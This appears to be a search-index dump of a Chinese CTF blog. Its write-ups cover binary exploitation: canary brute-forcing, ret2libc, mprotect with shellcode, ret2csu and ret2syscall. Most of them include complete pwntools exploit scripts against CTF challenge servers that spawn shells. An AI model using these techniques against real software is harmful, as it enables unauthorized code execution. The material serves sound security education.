[{"title":"Canary爆破","url":"/2025/01/25/Canary%E7%88%86%E7%A0%B4/","content":"ctfshow53（1）checksec\n发现并没有开canary保护，其实这道题只是在栈上放了一个作用与canary类似的，程序运行过程中也会比较它的值是否改变\n思路：我们可以逐字节的将canary爆破出来\n（2）ida代码审计\n看看Canary\n\n意思就是先声明了一个指针变量  stream，打开canary.txt文件，如果没有这个文件就退出，如果有使用  fread 函数从打开的文件中读取 4 个字节的数据存储在全局变量global_canary\n看看ctfshow\n\n  将global_canary赋给s1，然后是一个while循环， 使用read函数读取字符到v2中，直至遇到换行符 \\n（ASCII码为10）停止，v5记录存储的个数，每当存储一次v5的值就+1，，然后使用  __isoc99_sscanf 函数将  v2 中的字符串转换为整数，并存储到  nbytes 中，nbytes为size_t 类型无符号型，当我们输入-1时候就会被解释为一个非常大的数（（通常是 0xFFFFFFFF，即 size_t 类型的最大值）），所以我们可以输入-1来绕过while循环，并且可以利用第二个read进行栈溢出\n最后if循环就是比较canary的值是否改变的，将s1的值与global_canary比较如果不一样输出”Error *** Stack Smashing Detected *** : Canary Value Incorrect!”并且退出，一样的话输出”Where is the flag?”\n最后flag\n\n意思就是打开flag的文件，通过puts函数将flag的值输出\n（3）思路\n先将canary逐个字节爆破出来，然后通过栈溢出返回到flag的地址就可以\n1.canary爆破爆破canary s1中储存的就是canary的值，我们可以先覆盖0x20个数据覆盖到s1，然后一个字节一个字节的去覆盖s1的值，因为只覆盖一个字节，其他的不变，通过看puts函数输出的值判断是否覆盖正确，当第一个字节正确就把他记录下来，然后爆破第二个字节时，再将第一个字节输入进去再爆破第二个字节，依次类推，这里我们可以借助脚本去爆破,粘贴一个大佬写的脚本我来解释一下\nfrom pwn import *canary = b&#x27;&#x27;                                           #定义canaryfor i in range(4):                                     #这里是两层循环，因为canary是四个字节所以外层循环4次    for j in range(0x100):                             #这个循环尝试所有可能的字节值（从 0x00 到 0xFF）        p = remote(&#x27;pwn.challenge.ctf.show&#x27;, 28179)              p.sendlineafter(b&#x27;&gt;&#x27;,b&#x27;200&#x27;)                   #200为用户名        payload = b&#x27;a&#x27;*0x20 + canary + p8(j)           #先覆盖0x20到canary，在覆盖已经试出来前几个字节canary的值，再加上                                                         要尝试的        p.sendafter(&#x27;$ &#x27;, payload)                             ans = str(p.recv())                            #将接收的的值转化为字符串赋值给ans        if &quot;Canary Value Incorrect!&quot; not in ans:       #这个if循环是判断逐字节爆破的canary是否正确，我们知道错误就会输出                                                        Canary Value Incorrect!，如果我们接收到的数据中没有Canary Value                                                        Incorrect!就证明是正确的            canary += p8(j)                            #将新爆破出来的值加到已经爆破出来的值的后面            print(f&quot;NO:&#123;i+1&#125;  &#123;hex(j)&#125;&quot;)               #因为i是取0-3的整数，所以要+1才是canary的第几个值            break                                      #退出循环        else:            print(f&quot;try again! &#123;i&#125;:&#123;j&#125;&quot;)print(f&quot;canary: &#123;hex(u32(canary))&#125;&quot;)                   #最后将canary的值转换为32位输出出来\n\n2.栈溢出exp\nfrom pwn import *p=remote(&#x27;pwn.challenge.ctf.show&#x27;,28179)canary=0x21443633                              #canary上面爆破过了，我们直接输入就可以，前提是canary的值是固定的flag=0x08048696p.recvuntil(b&#x27;How many bytes do you want to write to the buffer?\\n&gt;&#x27;)  p.sendline(b&#x27;-1&#x27;)                              #绕过while循环，并使得可以借助read函数栈溢出p.recvuntil(b&#x27;$ &#x27;)                            pay=b&#x27;a&#x27;*0x20+p32(canary)+b&#x27;a&#x27;*(0xc+0x4)+p32(flag) #payload=覆盖到s1+canary+覆盖到返回地址+返回地址p.sendline(pay)p.interactive()\n\n参考文章ctfshowpwn 45 -＞ 90（已更新33）栈溢出_pwn59-CSDN博客\ncanary保护和pie保护的绕过_ctfshow pwn入门-CSDN博客\n","categories":["第二周"],"tags":["wp"]},{"title":"2024湘岚杯ezlibc","url":"/2025/01/18/ezlibc/","content":"前言\n\n本题是Canary保护+ret2libc，根据这个题目来总结一下canary保护和ret2libc\nCanary保护（1）Canary介绍Canary 的意思是金丝雀，来源于英国矿井工人用来探查井下气体是否有毒的金丝雀笼子。工人们每次下井都会带上一只金丝雀。如果井下的气体有毒，金丝雀由于对毒性敏感就会停止鸣叫甚至死亡，从而使工人们得到预警。\n（2）Canary原理当函数开始执行时，会在内存某处插入一组随机数canary（一般是 寄存器fs: 0x28 处，栈中 %ebp-0x8 的位置），我们在直接进行栈溢出时canary的值就会改变，在函数退栈返回前，程序会比对栈上的canary副本和原始的canary。如果二者不同，则说明发生了栈溢出，这时程序会直接崩溃，调用__stack_chk_fail函数来终止程序\n\n\n（3）Canary绕过我们知道在进行栈溢出时Canary的值已经改变，但函数退栈返回前程序会比对Canary的值，我们可以先把Canary泄露出来，进行栈溢出时候，再把Canary的值发送，这样Canary的值就不会改变\n（4）Canary特点Canary所生成的随机数有一个非常重要的特点：随机数的第一个字节必然是 0x00。如此设计的主要目的是实现字符串截断，当我们进行泄露时遇到0x00直接就停止了，但是我们进行栈溢出时，可以多发送一个字节，使\\x00被覆盖，这样我们就可以成功的将Canary泄露出来\nret2libc（1）题目特点进行栈溢出时，程序可能没有后门函数，可能既没有system函数，又没有”&#x2F;bin&#x2F;sh”字符串，我们就无法拿到shell，但是我们可以借助libc库将其真实地址计算出来\n（2）解题思路我们知道函数的真实地址  &#x3D;  基地址  +  偏移地址 ，如果我们知道每次程序运行的基地址，以及每个函数的偏移地址，我们就可以计算出函数的真实地址\n基地址：每次运行程序加载函数时，函数的基地址都会发生改变\n偏移地址：libc库中存放的就是这些函数的偏移地址，函数真实地址的后三位不会变化，根据其最后三位借助，可以判断出libc库的版本\n查询libc版本网站：libc database search\n使用方法：输入函数名称和真实地址\n如何计算基地址：\n我们知道基地址 &#x3D; 函数的真实地址 - 偏移地址\n我们可以借助puts(),write()这样的函数将某个函数的真实地址打印出来（即got表中存放的地址），由于Linux的动态延迟绑定技术，我们必须选择一个main函数中已经执行过的函数，一般选择puts和write\n（4）plt表和got表 PLT表（Procedure Linkage Table）：PLT表用于实现函数调用的延迟绑定。当程序调用一个外部函数时，首先会跳转到PLT表中的相应条目，PLT表中的代码会检查GOT表中该函数地址是否已经解析。如果已经解析，就直接跳转到GOT表中的实际函数地址；如果尚未解析，就会触发动态链接器进行解析操作，然后更新GOT表并完成函数调用\nGOT表（Global Offset Table）：GOT表用于存放外部函数和全局变量的地址。GOT表在动态链接过程中起着关键作用，它允许程序在运行时查找和调用外部函数。\n在这里引用一张大佬的图解释\n\n（5）延迟绑定定义：延迟绑定（Lazy Binding）是一种在程序运行过程中动态链接共享库函数的技术。它的核心思想是推迟对外部函数（位于共享库中的函数）的地址解析，直到程序首次调用该函数时才进行解析。这样做的主要目的是为了提高程序的启动速度，因为如果在程序启动时就对所有可能用到的外部函数进行地址解析，会花费大量时间，而且很多函数可能在程序运行过程中根本不会被调用\n调用函数A的过程\n首次调用：\n\n再次调用:\n\n（6）总结1.找到一个main函数中已经执行过的函数，构造payload1调用puts或write将其真实地址打印出来，根据真实地址确定libc版本，以及函数的偏移地址\n2.根据基地址&#x3D;真实地址-偏移地址\n3.根据真实地址&#x3D;基地址+偏移地址算出system函数和”&#x2F;bin&#x2F;sh”字符串的真实地址\n4.构造payload2，劫持程序，拿到shell\nexp以及解释from pwn import *from LibcSearcher import *io=process(&#x27;./ezlibc&#x27;)elf=ELF(&quot;./ezlibc&quot;)io=remote(&#x27;xlctf.huhstsec.top&#x27;,40657)context(arch=&quot;amd64&quot;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)#payload1:泄露canarypayload1=b&#x27;a&#x27;*(0x30-0x8)+b&#x27;b&#x27;                                 #多发送一个b来覆盖canary的\\x00io.recvuntil(b&#x27;flag!&#x27;)io.send(payload1);                                            #这里不能用sendline，因为回车会占字节io.recvuntil(b&#x27;ab&#x27;)                                           #定位到Canary之前canary=u64(b&#x27;\\x00&#x27;+io.recv(7))                                #接受canary将\\x00重新填上，再接受7个字节，并转换为64位print(&#x27;canary:&#x27;,hex(canary))pop_rdi_ret_addr=0x400843ret_addr=0x000000000040059e               puts_plt=elf.plt[&#x27;puts&#x27;]                                      #查找puts函数plt表的地址main_addr=0x4006e7puts_got=elf.got[&quot;puts&quot;]                                      #查找puts函数got表的地址print(&quot;puts_plt:&quot;,hex(puts_plt))print(&quot;plt_got:&quot;,hex(puts_got))#payload2:泄露puts真实地址payload2=b&#x27;a&#x27;*(0x30-8)+p64(canary)+b&#x27;a&#x27;*8                     #先覆盖到到canary之前，再将canary发送payload2+=p64(pop_rdi_ret_addr)+p64(puts_got)                 #将puts函数got表的地址储存在寄存器rdi里  payload2+=p64(puts_plt)                                       #调用puts函数payload2+=p64(main_addr)                                      #最后返回到main，再次进行栈溢出  io.recvuntil(b&quot;Maybe UR closer to the key&quot;)                     io.sendline(payload2)puts_addr = u64(io.recvuntil(b&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))  #接收puts函数的真实地址，从7f开始接收，长度补足8个字节print(&quot;real addr:&quot;,hex(puts_addr))libc=LibcSearcher(&#x27;puts&#x27;,puts_addr)                           #查询libc版本base=puts_addr-libc.dump(&#x27;puts&#x27;)                              #计算基地址system=base+libc.dump(&#x27;system&#x27;)                               #计算system函数地址bin_sh=base+libc.dump(&#x27;str_bin_sh&#x27;)                           #计算/bin/sh字符串地址#payload3：构造调用system(&quot;/bin/sh&quot;)payload3=b&#x27;a&#x27;*(0x30-8)+p64(canary)+b&#x27;a&#x27;*8      payload3+=p64(ret_addr)                                       #栈平衡payload3+=p64(pop_rdi_ret_addr)+p64(bin_sh)                   #将/bin/sh的地址储存在rdi寄存器中payload3+=p64(system)io.sendline(payload3)io.interactive()\n\n最后题目为我们提供Libc版本.so文件, 与 不提供的区别（1）当题目不提供libc.so文件我们就需要借助LibcSearche库from LibcSearcher import *libc=LibcSearcher(&#x27;puts&#x27;,puts_addr)  base=puts_addr-libc.dump(&#x27;puts&#x27;)                              #计算基地址system=base+libc.dump(&#x27;system&#x27;)                               #计算system函数地址bin_sh=base+libc.dump(&#x27;str_bin_sh&#x27;)                           #计算/bin/sh字符串地址\n\n(2)当题目提供libc.so文件libc=ELF(&#x27;libc-2.23.so&#x27;)base=puts_addr-libc.sym[&#x27;puts&#x27;]                              #计算基地址system=base+libc.sym[&#x27;system&#x27;]                               #计算system函数地址bin_sh = libc_base + next(libc.search(b&#x27;/bin/sh&#x27;))           #计算/bin/sh字符串地址\n\n参考文章：canary：canary介绍与绕过技巧_金丝雀漏洞缓解-CSDN博客\n​\t      pwn入门之canary保护_pwn canary-CSDN博客\nret2libc:pwn入门：基本栈溢出之ret2libc详解（以32位+64位程序为例）-CSDN博客\nexp:[【PWN · ret2libc | Canary】2021 鹤城杯]littleof-CSDN博客\n区别：CTF(Pwn) 当题目为我们提供Libc版本.so文件, 与 不提供的区别_ctf题中.so文件-CSDN博客\n","categories":["第二周"],"tags":["wp"]},{"title":"ctfshow 43，44","url":"/2025/01/22/ctfshow/","content":"pwn43ida：\n\n发现gets可以栈溢出（0x6c+0x4），但是并没有找到bin&#x2F;sh或sh字符串，但是有system\n\n运行gdb使用vmmap命令即可观察到各段的权限信息\n我们发现0x804b000-0x804c000是可写的\n\n-p 标志表示内存区域的权限，它由四个字符组成，每个字符分别代表一个权限：\nr：可读（Readable）w：可写（Writable）x：可执行（Executable）s：共享（Shared）\n我们在bss段找到了变量buf2是可写的\n通常情况下，BSS 段下的变量是可写的。BSS 段是用来存储未初始化的全局变量和静态变量的，操作系统在程序加载时会为这些变量分配内存并将其初始化为零或空指针。因此，BSS 段下的变量通常具有读写权限，可以被程序写入数据。\n\n思路：我们可以调用gets函数将&#x2F;bin&#x2F;sh字符串写入变量buf2，在传递给system函数的第一个参数就构造成功了system(“&#x2F;bin&#x2F;sh”)\ngets：0x08048420\nsystem：0x08048450\nexp：\nfrom pwn import*io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28119)buf2 = 0x0804B060system = 0x08048450gets = 0x08048420payload= b&#x27;a&#x27;*(0x6c+0x4)payload += p32(gets)payload += p32(system)   #作为gets函数的返回地址，返回到system函数中payload += p32(buf2)     #作为gets函数的参数（发送的/bin/sh将会被写入buf2），也是system函数的返回地址(是无效的)payload += p32(buf2)     #system函数的参数io.sendline(payload)io.sendline(b&quot;/bin/sh&quot;)io.interactive()\n\npwn44这道题思路与pwn43一样只不过是64位的，传参方式不同\n\n栈溢出（0xa+0x8）\n\nsystem：0x0400520\ngets：0x0400530\nfrom pwn import*io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28255)buf2 = 0x602080system = 0x0400520gets = 0x0400530ret = 0x00000000004004ferdi = 0x00000000004007f3payload= b&#x27;a&#x27;*(0xa+0x8)payload += p64(rdi)  payload += p64(buf2)payload += p64(gets)payload += p64(rdi)payload += p64(buf2)    payload += p64(system)    io.sendline(payload)io.sendline(b&quot;/bin/sh&quot;)io.interactive()\n\n总结pwn33，34（1）解题思路当没有bin&#x2F;sh或者sh字符串时，但是bss存在未初始化的变量，我们可以调用gets，read等函数将&#x2F;bin&#x2F;sh字符串写入将其作为system的第一个参数，构造system(“&#x2F;bin&#x2F;sh”)\n（2）64位与32位栈溢出后函数调用的不同\n32位调用函数参数全在栈上，64位前是7个参数放在寄存器里，后面的放在栈上面。\n\n32位调用函数压栈顺序是先压参数最后压返回函数，64位先是压入返回函数然后将参数放在寄存器\n\n\n","categories":["第二周"],"tags":["wp"]},{"title":"Hello World","url":"/2025/11/17/hello-world/","content":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.\nQuick StartCreate a new post$ hexo new &quot;My New Post&quot;\n\nMore info: Writing\nRun server$ hexo server\n\nMore info: Server\nGenerate static files$ hexo generate\n\nMore info: Generating\nDeploy to remote sites$ hexo deploy\n\nMore info: Deployment\n"},{"title":"mprotect函数","url":"/2025/01/24/mprotect%E5%87%BD%E6%95%B0/","content":"一、mprotect() 函数（1）mprotect() 函数简介在二进制漏洞利用（Pwn）中，mprotect() 函数是一个非常重要的系统调用，它用于修改内存区域的访问权限。这在漏洞利用中很有用，例如当你想要在一段原本不可执行的内存区域中执行 shellcode 时，就可以使用 mprotect() 函数将该区域的权限修改为可执行。\n（2）mprotect() 函数的原型#include &lt;sys/mman.h&gt;int mprotect(void *addr, size_t len, int prot);\n\n参数说明：\n\n\n\naddr\nlen\nprot\n\n\n\n修改权限的内存区域的起始地址，该地址必须是系统页大小（通常是 4096 字节）的整数倍\n修改权限的内存区域的长度，单位是字节\n指定新的内存访问权限\n\n\n内存访问权限：\n\n\n\nPROT_READ\nPROT_WRITE\nPROT_EXEC\nPROT_NONE\n\n\n\n允许读取该内存区域\n允许写入该内存区域\n允许执行该内存区域中的代码\n禁止对该内存区域进行任何访问\n\n\n注：一般prot直接修改为7，即可读可写可执行\n二、例题ctfshow49（1）思路我们可以通过栈溢出调用mprotect() 函数，将bss段修改为可读可写可执行，通过read函数将shellcode写入bss段，最后将返回地址改为bss段就可以\n但是mprotect函数需要设置三个参数，我们要找到一个含有三个pop一个ret指令的地址，将原有的参数pop走，再写入新的参数\n我们使用ROPgadge命令找到三个连续的寄存器  ROPgadget –binary pwn  –only “pop|ret”\n\npop_ebx_esi_ebp_ret &#x3D; 0x080a019b\n第一个参数：addr&#x3D;0x80d8000\n第二个参数：len&#x3D;0x1000\n第三个参数：port&#x3D;7\n同样read函数也需要设置三个参数\n在 C 语言里，read 函数的原型如下\n#include &lt;unistd.h&gt;ssize_t read(int fd, void *buf, size_t count);\n\n参数解释：\nfd：文件描述符，用于指定从哪个文件或设备读取数据（0标准输入；1标准输出；2错误输出）\nbuf：指向用于存储读取数据的缓冲区的指针\ncount：期望读取的最大字节数\n第一个参数：fd&#x3D;0\n第二个参数：buf&#x3D;0x80d8000（bss段任意一个地址就可以）\n第三个参数：count&#x3D;0x1000\n（2）expfrom pwn import*elf=ELF(&#x27;./pwn&#x27;)context(os = &#x27;linux&#x27;, arch = &#x27;i386&#x27;, log_level = &#x27;debug&#x27;)io = remote(&#x27;pwn.challenge.ctf.show&#x27;, 28134)mprotect= elf.sym[&#x27;mprotect&#x27;]read = elf.sym[&#x27;read&#x27;]pop_ebx_esi_ebp_ret = 0x080a019bshellcode = asm(shellcraft.sh())               #生成shellcodeaddr=0x80d8000buf=0x80d8000len=0x1000port=7payload = b&#x27;a&#x27;*(0x12+0x4)+p32(mprotect)           #将返回地址设为mprotectpayload += p32(pop_ebx_esi_ebp_ret)+p32(addr)+p32(len)+p32(port)   #设置mprotect的参数payload += p32(read)                              #将mprotect返回地址设为readpayload +=p32(pop_ebx_esi_ebp_ret)+p32(0)+p32(buf)+p32(len)               #设置read的参数payload +=p32(buf)                               #将read的返回地址设为buf（也就是shellcode）io.sendline(payload)io.sendline(shellcode)                            #将shellcode写入bssio.interactive()\n\n","categories":["第二周"],"tags":["wp"]},{"title":"ret2csu","url":"/2025/02/09/ret2csu/","content":"ret2csu的知识点（1）ret2csu的概念ret2csu是一种利用__libc_csu_init函数中的gadget进行ROP链构造的技术，主要用于控制寄存器参数，特别是当程序中缺少足够的gadgets时。这个函数在动态链接的程序中普遍存在，所以适用性较广。当我们做题时我们会发现有些gadget不存在这时我们就可以用ret2csu这种方法\n（2）__libc_csu_init函数__libc_csu_init有两部分我们把这两部分叫gadget2和gadget1\n\n下面这一部分gadget1\n.text:0000000000400716 loc_400716:                             ; CODE XREF: __libc_csu_init+34↑j.text:0000000000400716                 add     rsp, 8.text:000000000040071A                 pop     rbx.text:000000000040071B                 pop     rbp.text:000000000040071C                 pop     r12.text:000000000040071E                 pop     r13.text:0000000000400720                 pop     r14.text:0000000000400722                 pop     r15.text:0000000000400724                 retn\n\n可以看到是将数据弹入到rbx、rbp、r12、r13、r14、r15这六个寄存器中，这样我们就不用找gadget，更重要的是gadget2\n上面一部分是gadget2\n.text:0000000000400700 loc_400700:                             ; CODE XREF: __libc_csu_init+54↓j.text:0000000000400700                 mov     rdx, r13.text:0000000000400703                 mov     rsi, r14.text:0000000000400706                 mov     edi, r15d.text:0000000000400709                 call    ds:(__frame_dummy_init_array_entry - 600E10h)[r12+rbx*8].text:000000000040070D                 add     rbx, 1.text:0000000000400711                 cmp     rbx, rbp.text:0000000000400714                 jnz     short loc_400700\n\n可以看到是将r13寄存器的值赋值给rdx，r14赋值给rsi，r15赋值给rdi，然后调用函数，这里的rbx是索引寄存器**(设置为0，将r12设置为调用函数的got表地址）*，再往后rbx的值加1，比较rbx与rbp的值，如果rbx不等于 rbp，就跳转到loc_400700处，继续循环，为了避免继续循环我们将rbp的值设置为1，这样就可以跳出循环，继续往下执行也就是gadgets1，loc_400716处，如果不需要再一次控制参数的话，那我们此时把栈中的数据填充56（78）个垃圾数据即可\n注:\n1.如何不执行call\n如果我们仅仅利用__libc_csu_init函数去控制参数，而并不想去用call执行，我们可以call一个空函数（不需要参数，执行之后也不会对程序本身造成任何影响的函数）_term_proc函数（call的是指向_term_proc的地址，不是term_proc的地址）\n2.如何控制rax的值？(修改rax进行系统调用)\n这里就非常巧妙了，可以利用write和read的返回值\n如果读取或写入成功就会将read函数和write函数实际读到和写入的字节数存入rax中，这样就达到了控制rax的值\n如果错误会返回-1，存入errno\n例题ida：\nssize_t x64_ret2libc()&#123;  char buf[128]; // [rsp+0h] [rbp-80h] BYREF  write(1, &quot;Welcome to x64_ret2csu\\n&quot;, 0x17uLL);  return read(0, buf, 300uLL);&#125;\n\nread可以栈溢出(0x80+0x8)\n思路：\n通过栈溢出到gadget1，设值write的参数，返回值设置为gadget2，调用write，打印出write的got表地址，接下来套用模板就可以\n\n\n\nrbx\nrbp\nr12\nr13(rdx)\nr14(rsi)\nr15(rdi)\n\n\n\n0\n1\nwrite_got\n8\nwrite_got\n1\n\n\ngadget1:0x400716\ngadget2:0x400700\nmain:0x040065b\npop_rdi :0x400723\nret = 0x4004c9\nfrom pwn import *context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)elf = ELF(&#x27;./ret2csu&#x27;)libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)p = process(&#x27;./ret2csu&#x27;)gadget1 = 0x400716gadget2 = 0x400700write_got = elf.got[&#x27;write&#x27;]main = 0x040065bpop_rdi = 0x400723ret = 0x4004c9rbx = 0rbp = 1r12 = write_gotr13 = 8r14 = write_gotr15 = 1payload = b&#x27;a&#x27;*(0x80+0x8) payload += p64(gadget1)payload += p64(ret)payload += p64(rbx)\tpayload += p64(rbp)\t\tpayload += p64(r12)payload += p64(r13)\t\t\tpayload += p64(r14)\tpayload += p64(r15)\t\t\tpayload += p64(gadget2)payload += p64(0)*7payload += p64(main)p.recvuntil(b&quot;Welcome to x64_ret2csu\\n&quot;)p.send(payload)write_addr = u64(p.recv(8))print(hex(write_addr))libc_base = write_addr - libc.sym[&#x27;write&#x27;]system = libc_base + libc.sym[&#x27;system&#x27;]bin_sh = libc_base + next(libc.search(b&#x27;/bin/sh&#x27;))payload = b&#x27;a&#x27;*(0x80+8) +p64(pop_rdi) + p64(bin_sh) + p64(system)p.sendlineafter(b&quot;Welcome to x64_ret2csu\\n&quot;,payload)p.interactive()\n\n","categories":["第四周"],"tags":["wp"]},{"title":"ret2syscall例题","url":"/2025/02/08/ret2syscall%E4%BE%8B%E9%A2%98/","content":"ctfshow72（32位ret2syscall，多系统函数调用）Arch:       i386-32-littleRELRO:      Partial RELROStack:      No canary foundNX:         NX enabledPIE:        No PIE (0x8048000)Stripped:   No\n\n32位，开启NX保护，栈不可执行\nIDA:\nint __cdecl main(int argc, const char **argv, const char **envp)&#123;  int v4; // [esp+10h] [ebp-20h] BYREF  setvbuf(stdout, 0, 2, 0);  setvbuf(stdin, 0, 1, 0);  puts(&quot;CTFshow-PWN&quot;);  puts(&quot;where is my system?&quot;);  gets(&amp;v4);  puts(&quot;Emmm&quot;);  return 0;&#125;\n\n这道题与上一道题一样，只不过没有”&#x2F;bin&#x2F;sh”字符串，但是有read，我们可以调用read函数，往bss段写入&#x2F;bin&#x2F;sh\n0x08049421 : int 0x80\nread = 0x0806d170\n0x080bb2c6 : pop eax ; ret\n0x0806ecb0 : pop edx ; pop ecx ; pop ebx ; ret\n0x0806F350: int 0x80\nexp：\nfrom pwn import*io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28220)pop_eax_ret = 0x080bb2c6pop_edx_ecx_ebx_ret = 0x0806ecb0int_0x80 = 0x0806F350bss =   0x080EBB29binsh = &quot;/bin/sh\\x00&quot;                         #以空字符 &#x27;\\x00&#x27;作为结束标志的，防止读取后续内存中的数据payload = b&#x27;a&#x27;*(44)+p32(pop_eax_ret)payload += p32(0x3)+p32(pop_edx_ecx_ebx_ret)  #0x3是read函数的系统调用号payload += p32(0x100)+p32(bss)+p32(0)         #read的三个参数payload += p32(int_0x80)payload += p32(pop_eax_ret)+p32(0xb)payload += p32(pop_edx_ecx_ebx_ret)+p32(0)+p32(0)+p32(bss)payload += p32(int_0x80)io.sendline(payload)io.sendline(binsh)io.interactive()\n\n同时因为是静态编译我们可以借助mprotect函数修改bss段的权限\nexp：\nfrom pwn import*elf = ELF(&#x27;./pwn&#x27;)io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28187)mprotect= elf.sym[&#x27;mprotect&#x27;]read = elf.sym[&#x27;read&#x27;]pop_edx_ecx_ebx_ret = 0x0806ecb0bss =   0x080eb000shellcode = asm(shellcraft.sh())payload = b&#x27;a&#x27;*(44)+p32(mprotect)           payload += p32(pop_edx_ecx_ebx_ret)+p32(bss)+p32(0x100)+p32(7)    #mprotect参数payload += p32(read) payload +=p32(bss)                            payload += p32(0)+p32(bss)+p32(0x100)                             #read参数                 io.sendline(payload)io.sendline(shellcode)                            io.interactive()\n\n\n\nctfshow78（64位ret2syscall，多系统函数调用）Arch:       amd64-64-littleRELRO:      Partial RELROStack:      No canary foundNX:         NX enabledPIE:        No PIE (0x400000)Stripped:   No\n\n64位NX保护开启\nint __fastcall main(int argc, const char **argv, const char **envp)&#123;  char v4[80]; // [rsp+0h] [rbp-50h] BYREF  setvbuf(stdout, 0LL, 2LL, 0LL);  setvbuf(stdin, 0LL, 1LL, 0LL);  puts(&quot;CTFshowPWN!&quot;);  puts(&quot;where is my system_x64?&quot;);  gets(v4);  puts(&quot;fuck&quot;);  return 0;&#125;\n\ngets函数可以栈溢出（0x58）这道题与ctfshow72一样，没有bin&#x2F;sh字符串，需要借助read写入\n0x000000000046b9f8 : pop rax ; ret\n0x00000000004016c3 : pop rdi ; ret\n0x00000000004377f9 : pop rdx ; pop rsi ; ret\nsyscall = 0x45BAC5\nexp：\nfrom pwn import *context(arch=&quot;amd64&quot;,os=&quot;linux&quot;,log_level=&quot;debug&quot;)io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28200)#io = process(&#x27;./pwn&#x27;)rax_ret = 0x046b9f8rdi_ret = 0x04016c3rdx_rsi_ret =0x4377f9syscall = 0x45BAC5bss = 0x06C1DE3  binsh = b&quot;/bin/sh\\x00&quot;payload = b&#x27;a&#x27;*(0x58)+p64(rax_ret)+p64(0x0)payload += p64(rdi_ret)+p64(0)payload += p64(rdx_rsi_ret)+p64(0x100)+p64(bss)+p64(syscall)payload += p64(rax_ret)+p64(0x3b)payload += p64(rdi_ret)+p64(bss)payload += p64(rdx_rsi_ret)+p64(0)+p64(0)+p64(syscall)#gdb.attach(io)io.sendline(payload)io.send(binsh)io.interactive()\n\n这道题也可以借助mprotect来修改bss段权限\nfrom pwn import *context(arch=&quot;amd64&quot;,os=&quot;linux&quot;,log_level=&quot;debug&quot;)io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28191)elf = ELF(&#x27;./pwn&#x27;)rdi_ret = 0x04016c3rdx_rsi_ret =0x4377f9bss = 0x6c1c40 read =elf.sym[&#x27;read&#x27;]mprotect =elf.sym[&#x27;mprotect&#x27;]shellcode = asm(shellcraft.sh())payload = b&#x27;a&#x27;*(0x58)payload += p64(rdi_ret)+p64(0x6c1000)      payload += p64(rdx_rsi_ret)+p64(7)+p64(0x1000)+p64(mprotect)payload += p64(rdi_ret)+p64(0)payload += p64(rdx_rsi_ret)+p64(0x1000)+p64(bss)+p64(read)+p64(bss)io.sendline(payload)io.send(shellcode)io.interactive()\n\n","categories":["第四周"],"tags":["wp"]},{"title":"ret2syscall知识点","url":"/2025/02/07/ret2syscall%E7%9F%A5%E8%AF%86%E7%82%B9/","content":"ret2syscall 原理当程序是静态编译时，我们可以通过强制程序执行一个系统调用（syscall）来获得shell\n（1）系统调用基础系统调用是操作系统提供给用户程序的一组接口，用于访问操作系统内核的功能。在 Linux 系统中，常见的系统调用包括文件操作（如 open、read、write）、进程管理（如 fork、execve）、内存管理（如 mmap）等。当用户程序需要执行特权操作时，会通过系统调用陷入内核态，由内核执行相应的操作，并将结果返回给用户程序。\n（2）系统调用过程1.设置系统调用号\n用户程序若要发起系统调用，首先要确定所需调用的系统调用对应的编号，并将其存放在 eax 寄存器中（32位）或rax寄存器中（64位）\n系统调用号是操作系统为每个系统调用分配的一个唯一的整数值标识符。用户程序在发起系统调用时，需要通过这个系统调用号来告知操作系统具体要执行哪一个系统调用，ret2syscall通常采用execve（在当前进程的上下文中执行一个新的程序），32位（0x0b）、64位（0x3b）\nLinux 32 位系统exit 1fork 2read 3write 4open 5close 6waitpid 7creat 8link 9unlink 10execve 11chdir 12time 13mknod 14chmod 15lchown 16break 17oldstat 18lseek 19getpid 20mount 21umount 22setuid 23getuid 24stime 25ptrace 26alarm 27oldfstat 28pause 29utime 30stty 31gtty 32access 33nice 34ftime 35sync 36kill 37rename 38mkdir 39rmdir 40dup 41pipe 42times 43prof 44brk 45setgid 46getgid 47signal 48geteuid 49getegid 50acct 51umount2 52lock 53ioctl 54fcntl 55mpx 56setpgid 57ulimit 58oldolduname 59umask 60chroot 61ustat 62dup2 63getppid 64getpgrp 65setsid 66sigaction 67sgetmask 68ssetmask 69setreuid 70setregid 71sigsuspend 72sigpending 73sethostname 74setrlimit 75getrlimit 76getrusage 77gettimeofday 78settimeofday 79getgroups 80setgroups 81select 82symlink 83oldlstat 84readlink 85uselib 86swapon 87reboot 88readdir 89mmap 90munmap 91truncate 92ftruncate 93fchmod 94fchown 95getpriority 96setpriority 97profil 98statfs 99fstatfs 100ioperm 101socketcall 102syslog 103setitimer 104getitimer 105stat 106lstat 107fstat 108olduname 109iopl 110vhangup 111idle 112vm86old 113wait4 114swapoff 115sysinfo 116ipc 117fsync 118sigreturn 119clone 120setdomainname 121uname 122modify_ldt 123adjtimex 124mprotect 125sigprocmask 126create_module 127init_module 128delete_module 129get_kernel_syms 130quotactl 131getpgid 132fchdir 133bdflush 134sysfs 135personality 136afs_syscall 137setfsuid 138setfsgid 139_llseek 140getdents 141_newselect 142flock 143msync 144readv 145writev 146getsid 147fdatasync 148_sysctl 149mlock 150munlock 151mlockall 152munlockall 153sched_setparam 154sched_getparam 155sched_setscheduler 156sched_getscheduler 157sched_yield 158sched_get_priority_max 159sched_get_priority_min 160sched_rr_get_interval 161nanosleep 162mremap 163setresuid 164getresuid 165vm86 166query_module 167poll 168nfsservctl 169setresgid 170getresgid 171prctl 172rt_sigreturn 173rt_sigaction 174rt_sigprocmask 175rt_sigpending 176rt_sigtimedwait 177rt_sigqueueinfo 178rt_sigsuspend 179pread64 180pwrite64 181chown 182getcwd 183capget 184capset 185sigaltstack 186sendfile 187getpmsg 188putpmsg 189vfork 190ugetrlimit 191mmap2 192truncate64 193ftruncate64 194stat64 195lstat64 196fstat64 197lchown32 198getuid32 199getgid32 200geteuid32 201getegid32 202setreuid32 203setregid32 204getgroups32 205setgroups32 206fchown32 